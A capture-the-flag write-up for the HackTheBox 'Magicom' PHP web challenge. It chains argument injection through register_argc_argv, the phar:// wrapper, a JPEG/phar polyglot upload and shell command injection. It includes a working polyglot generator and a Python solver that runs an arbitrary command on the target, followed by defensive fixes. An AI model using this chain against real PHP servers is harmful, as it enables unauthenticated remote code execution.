## Overview

Magicom is a Medium HackTheBox **Web** challenge (Business CTF 2024). The site is a small PHP shop with an image-upload feature; the flag is read by a SUID `/readflag` on the box. Nothing in the app looks obviously exploitable on its own — the win comes from chaining four separate, individually-reasonable behaviours into unauthenticated [OS command injection](https://cwe.mitre.org/data/definitions/78.html).

## The technique

Reading the source, the interesting code is a CLI helper `cli/cli.php` that `entrypoint.sh` uses once to seed the database. It is never wired into the router — but four facts make it reachable and dangerous:

1. **`register_argc_argv = On`.** The challenge `php.ini` un-comments the line that PHP ships as `Off` (visible on the `/info` phpinfo page). With it on, php-fpm fills `$_SERVER['argv']` from the request **query string**, splitting tokens on `+`. Because nginx fastcgi-passes any `.php` under the webroot, `GET /cli/cli.php?+-m+import+-c+X+-f+Y` is equivalent to running the tool with those command-line arguments. This is an [argument injection](https://cwe.mitre.org/data/definitions/88.html) into a script that was never meant to face the web.

2. **`phar://` in `DOMDocument::load`.** `cli.php`'s `getConfig()` validates the `-c` path with `file_exists` (so no remote URLs), then `new DOMDocument(); ->load($cfg)`. `DOMDocument::load` honours the `phar://` stream wrapper — a [deserialization](https://cwe.mitre.org/data/definitions/502.html)-class sink that also lets us read a file *inside* a phar archive.

3. **A JPEG/phar polyglot beats the upload filter.** `/addProduct` accepts an image validated by extension, `mime_content_type`, `getimagesize`, and an Imagick thumbnail. A phar whose **stub is a valid minimal JPEG** passes every check while still being a working phar; the archive carries our `test.conf`. It is saved to `uploads/<16-hex>.jpeg`.

4. **Command injection in the config value.** `import()` runs `passthru("mysql -u$u -p$p $database < $file")`, and `$database` comes straight from the config's `<db name="database" value="...">` with no escaping. Setting that value to `magicom; /readflag #` injects a command whose stdout is returned in the HTTP response.

## Solution

Build the polyglot with a small PHP generator:

Create `gen.php`:

```php
<?php
$jpeg = "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00" /* ...valid minimal JPEG bytes... */;
$command = $_SERVER["argv"][1];
$content = '<config>
<db name="username" value="root"/>
<db name="password" value="rootganteng"/>
<db name="database" value="magicom; ' . $command . ' #"/>
</config>';
@unlink("image.jpg");
$phar = new Phar("image.phar");
$phar->startBuffering();
$phar->addFromString("test.conf", $content);
$phar->setStub($jpeg . " __HALT_COMPILER(); ?>");
$phar->stopBuffering();
rename("image.phar", "image.jpg");
```

Then drive the three requests:

Create `solve.py`:

```python
import sys, re, subprocess, requests
HOST = sys.argv[1].rstrip("/")
cmd  = sys.argv[2] if len(sys.argv) > 2 else "/readflag"

subprocess.run(["php", "-d", "phar.readonly=0", "gen.php", cmd], check=True)

with open("image.jpg", "rb") as f:
    requests.post(HOST + "/addProduct",
                  files={"image": ("image.jpg", f, "image/jpeg"),
                         "title": (None, "x"), "description": (None, "y")})

path = re.findall(r'uploads/[0-9a-f]+\.\w+', requests.get(HOST + "/product").text)[-1]
url  = HOST + f"/cli/cli.php?+-m+import+-c+phar:///www/{path}/test.conf+-f+/etc/passwd"
print(requests.get(url).text)
```

```sh
python3 solve.py http://<target>:<port> /readflag
```

The response body contains the flag (rendered `HTB{...}` here). The container boots slowly — it runs `mysql_install_db` and imports the seed SQL through `cli.php` before supervisord starts nginx — so poll `/` for a `200` before firing.

## Why it worked

Each link is defensible in isolation: exposing a CLI script, loading an XML config, accepting an image, running a database dump. Composed, they become unauthenticated RCE — `register_argc_argv` provides argv, `phar://` provides an in-image config, the polyglot provides delivery, and unescaped concatenation provides the shell.

## Fix / defense

Set `register_argc_argv = Off` and never fastcgi-pass CLI scripts under the webroot. Never `DOMDocument::load()` a user-influenced path — disable the phar wrapper or load with `LIBXML_NONET`. Store uploads outside the webroot and re-encode images (magic-byte checks do not stop polyglots). Finally, build shell commands with `escapeshellarg` or a parameterised `mysqli` client, never string concatenation.
